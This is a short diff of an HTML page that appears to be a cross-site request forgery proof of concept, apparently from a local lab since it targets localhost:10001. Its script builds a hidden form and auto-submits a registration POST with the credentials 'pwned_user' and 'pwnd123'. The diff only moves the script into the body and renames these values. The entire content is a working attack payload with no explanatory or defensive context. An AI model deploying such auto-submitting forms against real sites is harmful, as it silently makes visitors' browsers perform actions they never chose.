@@ -1,21 +1,22 @@
-<script>
-  window.onload = () => {
+<body>
+  <!-- empty body -->
+  <script>
     const form = document.createElement("form");
     form.method = "POST";
     form.action = "http://localhost:10001/register";
 
     const u = document.createElement("input");
     u.name = "username";
-    u.value = "haha";
+    u.value = "pwned_user";
 
     const p = document.createElement("input");
     p.name = "password";
-    p.value = "123";
+    p.value = "pwnd123";
 
     form.appendChild(u);
     form.appendChild(p);
 
     document.body.appendChild(form);
     form.submit();
-  };
-</script>
+  </script>
+</body>
